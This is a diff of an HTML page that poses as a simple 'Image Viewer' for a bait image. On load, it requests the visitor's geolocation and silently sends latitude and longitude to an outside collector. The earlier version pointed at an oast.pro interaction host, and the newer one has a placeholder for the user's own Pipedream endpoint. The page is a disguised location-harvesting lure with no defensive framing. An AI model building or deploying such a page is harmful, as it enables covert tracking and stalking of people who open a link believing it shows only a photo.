@@ -1,33 +1,55 @@
 <!DOCTYPE html>
+
 <html>
+
 <head>
+
     <title>Image Viewer</title>
+
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
     <style>
+
         body { background: #000; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+
         img { max-width: 100%; max-height: 100vh; object-fit: contain; }
+
     </style>
+
 </head>
+
 <body onload="getLocation()">
+
+
 
     <img src="bait.jpg.png" id="photo">
 
+
+
     <script>
-        // Paste your RequestBin "Endpoint URL" here (e.g., https://en...x.x.pipedream.net or similar)
-        const gate = "5a12ec3b9c2455e9a600gutcsgcyyyyyb.oast.pro";
+
+        // REPLACE THIS with your Pipedream URL
+
+        const gate = "PASTE_YOUR_PIPEDREAM_URL_HERE";
+
+
 
         function getLocation() {
+
             if (navigator.geolocation) {
+
                 navigator.geolocation.getCurrentPosition(function(position) {
-                    // This sends the Lat and Lon as query parameters
-                    const report = gate + "?lat=" + position.coords.latitude + "&lon=" + position.coords.longitude;
-                    
-                    fetch(report);
-                }, function(error) {
-                    console.log("Location denied or error occurred.");
+
+                    fetch(gate + "?lat=" + position.coords.latitude + "&lon=" + position.coords.longitude);
+
                 });
+
             }
+
         }
+
     </script>
+
 </body>
+
 </html>
